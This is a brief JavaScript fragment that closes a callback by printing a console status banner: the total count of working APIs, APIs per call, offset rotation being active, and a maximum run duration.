    console.log(`📊 Total WORKING APIs: ${APIS.length}`);
    console.log(`⚡ APIs per call: ${APIS_PER_CALL}`);
    console.log(`🔄 Offset rotation: ACTIVE`);
    console.log(`⏱️ Max duration: ${MAX_DURATION_MIN} min`);
    console.log('═══════════════════════════════════════════');
});
